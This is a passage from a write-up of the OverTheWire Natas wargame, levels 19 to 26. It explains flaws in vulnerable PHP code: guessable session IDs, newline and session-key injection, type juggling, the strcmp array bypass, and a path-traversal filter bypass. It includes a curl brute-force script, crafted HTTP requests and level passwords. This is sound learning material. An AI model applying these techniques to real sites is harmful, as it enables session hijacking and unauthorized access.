+&lt; Set-Cookie: PHPSESSID=3633382d61646d696e; path=/; HttpOnly
+</code></pre><p>And lets get all the unique PHPSESSID&rsquo;s and sort them.</p><pre><code class=language-text>312d61646d696e
+332d61646d696e
+342d61646d696e
+352d61646d696e
+...
+3633372d61646d696e
+3633382d61646d696e
+3633392d61646d696e
+3634302d61646d696e
+</code></pre><p>Looks like there is a fixed value and a variable value in the PHPSESSID</p><pre><code class=language-text>XX     + 2d61646d696e
+XXXX   + 2d61646d696e
+XXXXXX + 2d61646d696e
+</code></pre><p>The unfixed value is always 2 4 or 6 chars long. ASCII in HEX is 2 chars log. Let check that.</p><pre><code class=language-text>~# xxd -ps -r phpsessionid.hex  phpsessionid.txt
+~# cat phpsessionid.txt
+1-admin
+3-admin
+4-admin
+...
+637-admin
+638-admin
+639-admin
+640-admin
+</code></pre><p>So we have a random number between 1 and 640 again, only with -admin added.<br>Lets first just try admin (61646d696e) if that doenst work, lets brute force it.</p><p>nope</p><pre><code class=language-bash>SessionCookie=&quot;PHPSESSID=61646d696e&quot;
+curl_output=$(curl -s $'http://natas19.natas.labs.overthewire.org/' -H 'Authorization: Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==' --cookie &quot;$SessionCookie&quot; --data 'username=admin&amp;password=password')
+
+echo $curl_output
+ &lt;/html&gt; logged in as a regular user. Login as an admin to retrieve credentials for natas20.&lt;/div&gt;al...&lt;/head&gt;thewire.org/js/wechall.js&quot;&gt;&lt;/script&gt;
+</code></pre><p>Script</p><pre><code class=language-bash>MaxCookieID=640
+CurrentID=0
+while [ $CurrentID -ne $MaxCookieID ]
+do
+    CurrentID=$(( $CurrentID + 1 ))
+    CurrentIDHEX=$(echo -n &quot;$CurrentID-admin&quot; | xxd -p)
+    SessionCookie=&quot;PHPSESSID=$CurrentIDHEX&quot;
+    curl_output=$(curl -s $'http://natas19.natas.labs.overthewire.org/' -H 'Authorization: Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==' --cookie &quot;$SessionCookie&quot; --data 'username=admin&amp;password=password')
+    if echo $curl_output | grep -q &quot;regular user&quot;; then
+        echo &quot;[-] $CurrentID out of $MaxCookieID is not a admin session.&quot;
+    else
+        echo &quot;[+] $CurrentID out of $MaxCookieID is a admin session.&quot;
+        echo &quot;$(echo $curl_output | grep Password)&quot;
+        break
+    fi
+done
+</code></pre><p>Output</p><pre><code class=language-text>[-] 1 out of 640 is not a admin session.
+[-] 2 out of 640 is not a admin session.
+[-] 3 out of 640 is not a admin session.
+[-] 4 out of 640 is not a admin session.
+...
+[-] 278 out of 640 is not a admin session.
+[-] 279 out of 640 is not a admin session.
+[-] 280 out of 640 is not a admin session.
+[+] 281 out of 640 is a admin session.
+&lt;/html&gt; an admin. The credentials for the next level are:&lt;br&gt;&lt;pre&gt;Username: natas20 Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF&lt;/pre&gt;&lt;/div&gt;script&gt;
+</code></pre><p>eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF</p><h3 id=natas21>natas21</h3><pre><code class=language-php>&lt;?
+
+function debug($msg) { /* {{{ */
+    if(array_key_exists(&quot;debug&quot;, $_GET)) {
+        print &quot;DEBUG: $msg&lt;br&gt;&quot;;
+    }
+}
+/* }}} */
+function print_credentials() { /* {{{ */
+    if($_SESSION and array_key_exists(&quot;admin&quot;, $_SESSION) and $_SESSION[&quot;admin&quot;] == 1) {
+    print &quot;You are an admin. The credentials for the next level are:&lt;br&gt;&quot;;
+    print &quot;&lt;pre&gt;Username: natas21\n&quot;;
+    print &quot;Password: &lt;censored&gt;&lt;/pre&gt;&quot;;
+    } else {
+    print &quot;You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.&quot;;
+    }
+}
+/* }}} */
+
+/* we don't need this */
+function myopen($path, $name) {
+    //debug(&quot;MYOPEN $path $name&quot;);
+    return true;
+}
+
+/* we don't need this */
+function myclose() {
+    //debug(&quot;MYCLOSE&quot;);
+    return true;
+}
+
+function myread($sid) {
+    debug(&quot;MYREAD $sid&quot;);
+    if(strspn($sid, &quot;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-&quot;) != strlen($sid)) {
+    debug(&quot;Invalid SID&quot;);
+        return &quot;&quot;;
+    }
+    $filename = session_save_path() . &quot;/&quot; . &quot;mysess_&quot; . $sid;
+    if(!file_exists($filename)) {
+        debug(&quot;Session file doesn't exist&quot;);
+        return &quot;&quot;;
+    }
+    debug(&quot;Reading from &quot;. $filename);
+    $data = file_get_contents($filename);
+    $_SESSION = array();
+    foreach(explode(&quot;\n&quot;, $data) as $line) {
+        debug(&quot;Read [$line]&quot;);
+    $parts = explode(&quot; &quot;, $line, 2);
+    if($parts[0] != &quot;&quot;) $_SESSION[$parts[0]] = $parts[1];
+    }
+    return session_encode();
+}
+
+function mywrite($sid, $data) {
+    // $data contains the serialized version of $_SESSION
+    // but our encoding is better
+    debug(&quot;MYWRITE $sid $data&quot;);
+    // make sure the sid is alnum only!!
+    if(strspn($sid, &quot;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-&quot;) != strlen($sid)) {
+    debug(&quot;Invalid SID&quot;);
+        return;
+    }
+    $filename = session_save_path() . &quot;/&quot; . &quot;mysess_&quot; . $sid;
+    $data = &quot;&quot;;
+    debug(&quot;Saving in &quot;. $filename);
+    ksort($_SESSION);
+    foreach($_SESSION as $key =&gt; $value) {
+        debug(&quot;$key =&gt; $value&quot;);
+        $data .= &quot;$key $value\n&quot;;
+    }
+    file_put_contents($filename, $data);
+    chmod($filename, 0600);
+}
+
+/* we don't need this */
+function mydestroy($sid) {
+    //debug(&quot;MYDESTROY $sid&quot;);
+    return true;
+}
+/* we don't need this */
+function mygarbage($t) {
+    //debug(&quot;MYGARBAGE $t&quot;);
+    return true;
+}
+
+session_set_save_handler(
+    &quot;myopen&quot;,
+    &quot;myclose&quot;,
+    &quot;myread&quot;,
+    &quot;mywrite&quot;,
+    &quot;mydestroy&quot;,
+    &quot;mygarbage&quot;);
+session_start();
+
+if(array_key_exists(&quot;name&quot;, $_REQUEST)) {
+    $_SESSION[&quot;name&quot;] = $_REQUEST[&quot;name&quot;];
+    debug(&quot;Name set to &quot; . $_REQUEST[&quot;name&quot;]);
+}
+
+print_credentials();
+
+$name = &quot;&quot;;
+if(array_key_exists(&quot;name&quot;, $_SESSION)) {
+    $name = $_SESSION[&quot;name&quot;];
+}
+
+?&gt;
+</code></pre><p>Thought it had something todo with the SID. Could not figure it out.</p><p>Used a write up to get a hint for the newline (\n).</p><p>Everything in $_SESSION is added to data with a newline delimiter by the mywrite function. Data is then written to a session file.</p><pre><code class=language-php>ksort($_SESSION);
+    foreach($_SESSION as $key =&gt; $value) {
+        debug(&quot;$key =&gt; $value&quot;);
+        $data .= &quot;$key $value\n&quot;;
+    }
+    file_put_contents($filename, $data);
+    chmod($filename, 0600);
+</code></pre><p><a href=https://www.php.net/manual/en/function.explode.php>https://www.php.net/manual/en/function.explode.php</a><br>explode — Split a string by a string</p><p>Everything written in session file is read by the myread function.</p><p>Spaces in files are used by explode to split the string. as long as the first part is not equal to "&rdquo; the first part and seccond part of the explode are added back in the global $_SESSION variable.</p><pre><code class=language-php>foreach(explode(&quot;\n&quot;, $data) as $line) {
+    debug(&quot;Read [$line]&quot;);
+    $parts = explode(&quot; &quot;, $line, 2);
+    if($parts[0] != &quot;&quot;) $_SESSION[$parts[0]] = $parts[1];
+}
+</code></pre><p>This means if we write a session file that has 2 lines like this.</p><pre><code class=language-text>name somename
+admin 1
+</code></pre><p>the read function will do the following.</p><pre><code class=language-php>$_SESSION[name] = somename
+$_SESSION[admin] = 1
+</code></pre><p>this will then pass the print_credentials check. How do we do this ? Add a newline to the input.</p><p>admin\nadmin 1</p><pre><code class=language-text>POST /index.php HTTP/1.1
+Host: natas20.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 22
+Authorization: Basic bmF0YXMyMDplb2ZtM1dzc2h4YzVid3RWbkV1R0lscjdpdmI5S0FCRg==
+Connection: close
+Referer: http://natas20.natas.labs.overthewire.org/index.php
+Cookie: __cfduid=dc2e23c92b1d237ff6fcd21eeaace26841568619071; __utma=176859643.1037695426.1568619071.1568619071.1568619071.1; __utmz=176859643.1568619071.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); PHPSESSID=sess
+Upgrade-Insecure-Requests: 1
+Pragma: no-cache
+Cache-Control: no-cache
+
+name=admin%0Aadmin%201
+</code></pre><p>After running this port request a session file for <code>PHPSESSID=sess</code> has been created with the extra admin 1 value. If we load this PHPSESSID we will pass the admin check.</p><pre><code class=language-text>You are an admin. The credentials for the next level are:&lt;br&gt;&lt;pre&gt;Username: natas21
+Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ&lt;/pre&gt;
+</code></pre><h3 id=natas22>natas22</h3><pre><code class=language-php>&lt;?
+
+function print_credentials() { /* {{{ */
+    if($_SESSION and array_key_exists(&quot;admin&quot;, $_SESSION) and $_SESSION[&quot;admin&quot;] == 1) {
+    print &quot;You are an admin. The credentials for the next level are:&lt;br&gt;&quot;;
+    print &quot;&lt;pre&gt;Username: natas22\n&quot;;
+    print &quot;Password: &lt;censored&gt;&lt;/pre&gt;&quot;;
+    } else {
+    print &quot;You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.&quot;;
+    }
+}
+/* }}} */
+
+session_start();
+print_credentials();
+
+?&gt;
+</code></pre><pre><code class=language-php>&lt;?
+
+session_start();
+
+// if update was submitted, store it
+if(array_key_exists(&quot;submit&quot;, $_REQUEST)) {
+    foreach($_REQUEST as $key =&gt; $val) {
+    $_SESSION[$key] = $val;
+    }
+}
+
+if(array_key_exists(&quot;debug&quot;, $_GET)) {
+    print &quot;[DEBUG] Session contents:&lt;br&gt;&quot;;
+    print_r($_SESSION);
+}
+
+// only allow these keys
+$validkeys = array(&quot;align&quot; =&gt; &quot;center&quot;, &quot;fontsize&quot; =&gt; &quot;100%&quot;, &quot;bgcolor&quot; =&gt; &quot;yellow&quot;);
+$form = &quot;&quot;;
+
+$form .= '&lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;';
+foreach($validkeys as $key =&gt; $defval) {
+    $val = $defval;
+    if(array_key_exists($key, $_SESSION)) {
+    $val = $_SESSION[$key];
+    } else {
+    $_SESSION[$key] = $val;
+    }
+    $form .= &quot;$key: &lt;input name='$key' value='$val' /&gt;&lt;br&gt;&quot;;
+}
+$form .= '&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Update&quot; /&gt;';
+$form .= '&lt;/form&gt;';
+
+$style = &quot;background-color: &quot;.$_SESSION[&quot;bgcolor&quot;].&quot;; text-align: &quot;.$_SESSION[&quot;align&quot;].&quot;; font-size: &quot;.$_SESSION[&quot;fontsize&quot;].&quot;;&quot;;
+$example = &quot;&lt;div style='$style'&gt;Hello world!&lt;/div&gt;&quot;;
+
+?&gt;
+
+&lt;p&gt;Example:&lt;/p&gt;
+&lt;?=$example?&gt;
+
+&lt;p&gt;Change example values here:&lt;/p&gt;
+&lt;?=$form?&gt;
+</code></pre><p>goal, get admin=1 in the $_SESSION</p><p>Could not figure out what todo next. Used write up to understand what was going on.</p><p>It was actully rather simple. The main page will print the password if admin=1 is in $_SESSION. We can add this on the second page.</p><p>Since both pages seem to share PHPSESSIDs we should be able to abuse page 2 to influcense page 1.</p><p>A var called validkeys is setup, it then uses these validkeys as default values.and updates these values if they exists, if not it adds them</p><pre><code class=language-php>$validkeys = array(&quot;align&quot; =&gt; &quot;center&quot;, &quot;fontsize&quot; =&gt; &quot;100%&quot;, &quot;bgcolor&quot; =&gt; &quot;yellow&quot;);
+
+$form .= '&lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;';
+foreach($validkeys as $key =&gt; $defval) {
+    $val = $defval;
+    if(array_key_exists($key, $_SESSION)) {
+    $val = $_SESSION[$key];
+    } else {
+    $_SESSION[$key] = $val;
+    }
+    $form .= &quot;$key: &lt;input name='$key' value='$val' /&gt;&lt;br&gt;&quot;;
+}
+</code></pre><p>However, above this code is this peace. This code checks if submit is in the $_REQUEST global variable. If it is it adds everything thats in $_REQUEST to $_SESSION.</p><pre><code class=language-php>if(array_key_exists(&quot;submit&quot;, $_REQUEST)) {
+    foreach($_REQUEST as $key =&gt; $val) {
+    $_SESSION[$key] = $val;
+    }
+}
+</code></pre><p>This means if during a request that uses submit we can add our of values to the $_SESSION variable. If we add &admin=1 we will pass the print_credentials() check on the main page.</p><pre><code class=language-text>POST /index.php?debug HTTP/1.1
+Host: natas21-experimenter.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://natas21-experimenter.natas.labs.overthewire.org/index.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 65
+Authorization: Basic bmF0YXMyMTpJRmVrUHlyUVhmdHppREVzVXIzeDIxc1l1YWh5cGRnSg==
+Connection: close
+Cookie: __cfduid=dc2e23c92b1d237ff6fcd21eeaace26841568619071; __utma=176859643.1037695426.1568619071.1568619071.1568619071.1; __utmz=176859643.1568619071.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)
+Upgrade-Insecure-Requests: 1
+Pragma: no-cache
+Cache-Control: no-cache
+
+align=center&amp;fontsize=100%25&amp;bgcolor=yellow&amp;submit=Update&amp;admin=1
+
+HTTP/1.0 200 OK
+Date: Mon, 23 Sep 2019 12:09:42 GMT
+Server: Apache/2.4.10 (Debian)
+Set-Cookie: PHPSESSID=kvklchlc4spv0iu9i6a5a4g2b7; path=/; HttpOnly
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Vary: Accept-Encoding
+Content-Length: 1015
+Content-Type: text/html; charset=UTF-8
+X-Cache: MISS from localhost
+Via: 1.1 localhost:3128 (squid/2.7.STABLE9)
+Connection: close
+</code></pre><pre><code class=language-php>&lt;html&gt;
+&lt;head&gt;&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;http://www.overthewire.org/wargames/natas/level.css&quot;&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;h1&gt;natas21 - CSS style experimenter&lt;/h1&gt;
+&lt;div id=&quot;content&quot;&gt;
+&lt;p&gt;
+&lt;b&gt;Note: this website is colocated with &lt;a href=&quot;http://natas21.natas.labs.overthewire.org&quot;&gt;http://natas21.natas.labs.overthewire.org&lt;/a&gt;&lt;/b&gt;
+&lt;/p&gt;
+[DEBUG] Session contents:&lt;br&gt;Array
+(
+    [debug] =&gt;
+    [align] =&gt; center
+    [fontsize] =&gt; 100%
+    [bgcolor] =&gt; yellow
+    [submit] =&gt; Update
+    [admin] =&gt; 1
+)
+</code></pre><p>This means that our PHPSESSID now has admin=1</p><p>If we send a request to the main page with below PHPSESSID we will pass the admin check.<br>PHPSESSID=kvklchlc4spv0iu9i6a5a4g2b7</p><pre><code class=language-text>GET /index.php HTTP/1.1
+Host: natas21.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:69.0) Gecko/20100101 Firefox/69.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Authorization: Basic bmF0YXMyMTpJRmVrUHlyUVhmdHppREVzVXIzeDIxc1l1YWh5cGRnSg==
+Connection: close
+Cookie: __cfduid=dc2e23c92b1d237ff6fcd21eeaace26841568619071; __utma=176859643.1037695426.1568619071.1568619071.1568619071.1; __utmz=176859643.1568619071.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); PHPSESSID=kvklchlc4spv0iu9i6a5a4g2b7
+Upgrade-Insecure-Requests: 1
+
+You are an admin. The credentials for the next level are:&lt;br&gt;&lt;pre&gt;Username: natas22
+Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ&lt;/pre&gt;
+</code></pre><p>chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ</p><h3 id=natas23>natas23</h3><pre><code class=language-php>&lt;?
+session_start();
+
+if(array_key_exists(&quot;revelio&quot;, $_GET)) {
+    // only admins can reveal the password
+    if(!($_SESSION and array_key_exists(&quot;admin&quot;, $_SESSION) and $_SESSION[&quot;admin&quot;] == 1)) {
+    header(&quot;Location: /&quot;);
+    }
+}
+?&gt;
+
+&lt;?
+    if(array_key_exists(&quot;revelio&quot;, $_GET)) {
+    print &quot;You are an admin. The credentials for the next level are:&lt;br&gt;&quot;;
+    print &quot;&lt;pre&gt;Username: natas23\n&quot;;
+    print &quot;Password: &lt;censored&gt;&lt;/pre&gt;&quot;;
+    }
+?&gt;
+</code></pre><p>If revelio is in $_GET and admin is not set add a location header. This will result in a 302 redirect. Then, if revelio is in the $_GET request show the password.</p><p>We can set revelio with teh following params.<br>natas22.natas.labs.overthewire.org/?revelio=a</p><p>but if we do we get redirected.</p><p>Tried messing with the location cookie in the request. Turned out its way simpler, dont follow the 302.</p><p>Burp -> look at request that gets 302&rsquo;ed.</p><pre><code class=language-text>You are an admin. The credentials for the next level are:&lt;br&gt;&lt;pre&gt;Username: natas23
+Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE&lt;/pre&gt;
+</code></pre><p>D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE</p><h3 id=natas24>natas24</h3><pre><code class=language-text>Password:
+&lt;form name=&quot;input&quot; method=&quot;get&quot;&gt;
+    &lt;input type=&quot;text&quot; name=&quot;passwd&quot; size=20&gt;
+    &lt;input type=&quot;submit&quot; value=&quot;Login&quot;&gt;
+&lt;/form&gt;
+
+```php
+if(array_key_exists(&quot;passwd&quot;,$_REQUEST)){
+        if(strstr($_REQUEST[&quot;passwd&quot;],&quot;iloveyou&quot;) &amp;&amp; ($_REQUEST[&quot;passwd&quot;] &gt; 10 )){
+            echo &quot;&lt;br&gt;The credentials for the next level are:&lt;br&gt;&quot;;
+            echo &quot;&lt;pre&gt;Username: natas24 Password: &lt;censored&gt;&lt;/pre&gt;&quot;;
+        }
+        else{
+            echo &quot;&lt;br&gt;Wrong!&lt;br&gt;&quot;;
+        }
+    }
+    // morla / 10111
+?&gt;
+</code></pre><p>Could not figure this one out. After reading up on a write up, some PHP documentation and testing it myself I now understand what happens.</p><p><a href=https://www.php.net/manual/en/function.strstr.php>https://www.php.net/manual/en/function.strstr.php</a><br><a href=https://www.php.net/manual/en/language.types.string.php#language.types.string.conversion>https://www.php.net/manual/en/language.types.string.php#language.types.string.conversion</a><br><a href=https://stackoverflow.com/questions/672040/comparing-string-to-integer-gives-strange-results>https://stackoverflow.com/questions/672040/comparing-string-to-integer-gives-strange-results</a><br><a href=https://n0j.github.io/2017/03/23/otw-natas-23.html>https://n0j.github.io/2017/03/23/otw-natas-23.html</a><br><a href=https://blog.anshumanonline.com/natas24/>https://blog.anshumanonline.com/natas24/</a></p><pre><code class=language-text>strstr — Find the first occurrence of a string
+</code></pre><pre><code class=language-text>Now, PHP has a property that on comparison with numerals, the string will evaluate as numerals. If the string has a ‘e’ in it, it will be evaluated as a float variable, otherwise an int. Since there is necessarily an ‘e’ in our string (because of the “iloveyou”), our passwd will be evaluated as a float. Another interesting thing is that, while this comparison, the value of the string being evaluated as a numeral will be from the initial part of the string. If there is no numeral in the initial part, the evaluation will return as 0.
+</code></pre><pre><code class=language-text>When a string is evaluated in a numeric context, the resulting value and type are determined as follows.
+
+The string will be evaluated as a float if it contains any of the characters '.', 'e', or 'E'. Otherwise, it will be evaluated as an integer.
+
+The value is given by the initial portion of the string. If the string starts with valid numeric data, this will be the value used. Otherwise, the value will be 0 (zero). Valid numeric data is an optional sign, followed by one or more digits (optionally containing a decimal point), followed by an optional exponent. The exponent is an 'e' or 'E' followed by one or more digits.
+</code></pre><pre><code class=language-text>The == operator is a loosely-typed comparison. It will convert both to a common type and compare them. The way strings are converted to integers is explained here.
+
+Note that the page you linked to doesn't contradict this. Check the second table, where it says that comparing the integer 0 to a string &quot;php&quot; using == shall be true.
+
+What happens is that the string is converted to integer, and non-numeric strings (strings that do not contain or begin with a number) convert to 0.
+</code></pre><p>A string that consists of a number, or begins with a number, is considered a numeric string. If the string has other characters after that number, these are ignored.</p><p>If a string starts with a character that cannot be interpreted as part of a number, then it is a non-numeric string and will convert to 0. This doesn&rsquo;t mean that a numeric string has to start with a digit (0-9) - for example &ldquo;-1&rdquo; is a numeric string because the minus sign is part of a number in that case.</p><p>So for example, your string &ldquo;d85d1d81b25614a3504a3d5601a9cb2e&rdquo; does not start with a number, so it would convert to 0. But your second string &ldquo;3581169b064f71be1630b321d3ca318f&rdquo; would be converted to integer 3581169. So that&rsquo;s why your second test does not work the same way.</p><pre><code class=language-text>```php
+strstr ( string $haystack , mixed $needle [, bool $before_needle = FALSE ] ) : string
+</code></pre><pre><code class=language-text>haystack
+    The input string.
+
+needle
+    If needle is not a string, it is converted to an integer and applied as the ordinal value of a character. This behavior is deprecated as of PHP 7.3.0, and relying on it is highly discouraged. Depending on the intended behavior, the needle should either be explicitly cast to string, or an explicit call to chr() should be performed.
+
+before_needle
+    If TRUE, strstr() returns the part of the haystack before the first occurrence of the needle (excluding the needle).
+</code></pre><pre><code class=language-php>if(strstr(&quot;11aaaaaailoveyou&quot;,&quot;iloveyou&quot;)){echo &quot;a&quot;;}
+a
+
+if(&quot;11iloveyou&quot; &gt; 10 ){echo &quot;a&quot;;}
+a
+</code></pre><p>So what happens is that even though our string starts with 11, it passes whte strstr check. Why ? Becase strstr checks for the first occurrence of a string. It does not verify if the string is an exact match.<br>As long as iloveyou ocourse somewhere in the string it will return true.</p><pre><code class=language-php>if(strstr(&quot;11aaaaaailoveyou&quot;,&quot;iloveyou&quot;)){echo &quot;a&quot;;}
+a
+</code></pre><p>Then, duo the type conversion to a float (since our string contains a e) the iloveyou part is removed during the int check.</p><pre><code class=language-text>When a string is evaluated in a numeric context, the resulting value and type are determined as follows.
+The string will be evaluated as a float if it contains any of the characters '.', 'e', or 'E'. Otherwise, it will be evaluated as an integer.
+</code></pre><pre><code class=language-php>php &gt; $a=(float)&quot;11iloveyou&quot;;
+php &gt; var_dump($a);
+float(11)
+php &gt; echo $a;
+11
+if(&quot;11iloveyou&quot; &gt; 10 ){echo &quot;a&quot;;}
+a
+</code></pre><p>The credentials for the next level are:</p><p>Username: natas24 Password: OsRmXFguozKpTZZ5X14zNO43379LZveg</p><h3 id=natas25>natas25</h3><pre><code class=language-php>&lt;?php
+    if(array_key_exists(&quot;passwd&quot;,$_REQUEST)){
+        if(!strcmp($_REQUEST[&quot;passwd&quot;],&quot;&lt;censored&gt;&quot;)){
+            echo &quot;&lt;br&gt;The credentials for the next level are:&lt;br&gt;&quot;;
+            echo &quot;&lt;pre&gt;Username: natas25 Password: &lt;censored&gt;&lt;/pre&gt;&quot;;
+        }
+        else{
+            echo &quot;&lt;br&gt;Wrong!&lt;br&gt;&quot;;
+        }
+    }
+    // morla / 10111
+?&gt;
+</code></pre><p><a href=https://www.php.net/manual/en/function.strcmp.php>https://www.php.net/manual/en/function.strcmp.php</a></p><pre><code class=language-text>Returns &lt; 0 if str1 is less than str2;
+&gt; 0 if str1 is greater than str2,
+and 0 if they are equal.
+</code></pre><p>Could not figure this one out at first.</p><p>After googeling for strcmp php vulnerability i found some posts.</p><p><a href=https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016>https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016</a></p><pre><code class=language-text>After a bit more research, it seemed that strcmp had some issues when comparing a string to something else.
+
+If I set $_GET['password'] equal to an empty array, then strcmp would return a NULL. Due to some unherent weaknesses in PHP's comparisons, NULL == 0 will return true (more info)).
+</code></pre><p><a href=https://marcosvalle.github.io/ctf/php/2016/05/12/php-comparison-vlun.html>https://marcosvalle.github.io/ctf/php/2016/05/12/php-comparison-vlun.html</a></p><pre><code class=language-text>strcmp($str1, $str2) (Array injection)
+
+Let’s suppose now you are a smart person and are not willing to use the Equal operator. Since you have a beautiful C background, you will stick to strcmp() function. Nice! A function created to compare strings cannot should not be vulnerable when doing its job.
+
+According to the docs:
+
+    strcmp(string $str1, string $str2) –&gt; Returns &lt; 0 if str1 is less than str2; &gt; 0 if str1 is greater than str2, and 0 if they are equal.
+
+Ok, so it means every time strcmp(str1, str2) is 0 the strings are equal. Hmmm… What if there was another what to make strcmp() 0? Well, what happens when we pass one string and one non-string parameter like an array to strcmp()? Right, it will result in a false statment and the result of strcmp() will be 0!.
+
+&lt;?php
+        $str1 = &quot;pink&quot;;
+        $str2 = array(&quot;name&quot; =&gt; &quot;floyd&quot;);
+
+        if(strcmp($str1, $str2 == 0)){
+                echo &quot;OMG twins!&quot;;
+        }else{
+                echo &quot;Bieber, the king of the world&quot;;
+        }
+?&gt;
+
+Could you see what would the result be in case we changed str2 the way it is shown above?
+
+    WARNING strcmp() expects parameter 2 to be string, array given on line number 5 OMG twins!
+
+There it is! If we pass an array instead of a string to strcmp(), it gives a warning but evaluates the result as 0. This could be very useful for bypassing logins.
+</code></pre><p><a href=https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf>https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf</a></p><p>So of we pass passwd[]=1 we can cause &lsquo;strcmp() to barf&rsquo;.</p><pre><code class=language-php>strcmp(array(),&quot;&lt;censored&gt;&quot;) -&gt; NULL
+</code></pre><pre><code class=language-php>if((!strcmp)
+# is the same as
+if(strcmp == false)
+</code></pre><p>Since the functions checks for a 0 we can use this &lsquo;barf&rsquo; to get what we want.</p><pre><code class=language-php>if(!strcmp($_REQUEST[&quot;passwd&quot;],&quot;&lt;censored&gt;&quot;)){
+    # stuff
+}
+</code></pre><p>if we pass passwd[]=1 it will look like this.</p><pre><code class=language-php>if(!strcmp(array(),&quot;&lt;censored&gt;&quot;)){
+    # stuff
+}
+</code></pre><p>GHF6X7YwACaYYssHVY05cFq83hRktl4c</p><h3 id=natas26>natas26</h3><pre><code class=language-php>&lt;?php
+    // cheers and &lt;3 to malvina
+    // - morla
+
+    function setLanguage(){
+        /* language setup */
+        if(array_key_exists(&quot;lang&quot;,$_REQUEST))
+            if(safeinclude(&quot;language/&quot; . $_REQUEST[&quot;lang&quot;] ))
+                return 1;
+        safeinclude(&quot;language/en&quot;);
+    }
+
+    function safeinclude($filename){
+        // check for directory traversal
+        if(strstr($filename,&quot;../&quot;)){
+            logRequest(&quot;Directory traversal attempt! fixing request.&quot;);
+            $filename=str_replace(&quot;../&quot;,&quot;&quot;,$filename);
+        }
+        // dont let ppl steal our passwords
+        if(strstr($filename,&quot;natas_webpass&quot;)){
+            logRequest(&quot;Illegal file access detected! Aborting!&quot;);
+            exit(-1);
+        }
+        // add more checks...
+
+        if (file_exists($filename)) {
+            include($filename);
+            return 1;
+        }
+        return 0;
+    }
+
+    function listFiles($path){
+        $listoffiles=array();
+        if ($handle = opendir($path))
+            while (false !== ($file = readdir($handle)))
+                if ($file != &quot;.&quot; &amp;&amp; $file != &quot;..&quot;)
+                    $listoffiles[]=$file;
+
+        closedir($handle);
+        return $listoffiles;
+    }
+
+    function logRequest($message){
+        $log=&quot;[&quot;. date(&quot;d.m.Y H::i:s&quot;,time()) .&quot;]&quot;;
+        $log=$log . &quot; &quot; . $_SERVER['HTTP_USER_AGENT'];
+        $log=$log . &quot; \&quot;&quot; . $message .&quot;\&quot;\n&quot;;
+        $fd=fopen(&quot;/var/www/natas/natas25/logs/natas25_&quot; . session_id() .&quot;.log&quot;,&quot;a&quot;);
+        fwrite($fd,$log);
+        fclose($fd);
+    }
+?&gt;
+
+&lt;h1&gt;natas25&lt;/h1&gt;
+&lt;div id=&quot;content&quot;&gt;
+&lt;div align=&quot;right&quot;&gt;
+&lt;form&gt;
+&lt;select name='lang' onchange='this.form.submit()'&gt;
+&lt;option&gt;language&lt;/option&gt;
+&lt;?php foreach(listFiles(&quot;language/&quot;) as $f) echo &quot;&lt;option&gt;$f&lt;/option&gt;&quot;; ?&gt;
+&lt;/select&gt;
+&lt;/form&gt;
+&lt;/div&gt;
+
+&lt;?php
+    session_start();
+    setLanguage();
+
+    echo &quot;&lt;h2&gt;$__GREETING&lt;/h2&gt;&quot;;
+    echo &quot;&lt;p align=\&quot;justify\&quot;&gt;$__MSG&quot;;
+    echo &quot;&lt;div align=\&quot;right\&quot;&gt;&lt;h6&gt;$__FOOTER&lt;/h6&gt;&lt;div&gt;&quot;;
+?&gt;
+</code></pre><p>bypass first the directory traversal check.<br>if we pass &mldr;/&mldr;// it will be replaced to ../ .</p><pre><code class=language-php>// check for directory traversal
+if(strstr($filename,&quot;../&quot;)){
+    logRequest(&quot;Directory traversal attempt! fixing equest.&quot;);
+    $filename=str_replace(&quot;../&quot;,&quot;&quot;,$filename);
+}
+
+print str_replace(&quot;../&quot;,&quot;&quot;,&quot;.../...//&quot;);
+../
